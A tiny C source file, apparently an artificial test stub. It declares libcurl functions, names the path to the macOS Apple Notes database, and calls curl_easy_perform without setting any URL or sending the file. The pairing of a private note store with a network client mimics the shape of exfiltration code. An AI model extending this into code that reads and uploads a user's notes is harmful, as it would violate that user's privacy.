extern void *curl_easy_init(void);
extern int curl_easy_perform(void *);
const char *store = "Library/Group Containers/group.com.apple.notes/NoteStore.sqlite";
int main(void) { void *client = curl_easy_init(); return curl_easy_perform(client) + store[0]; }
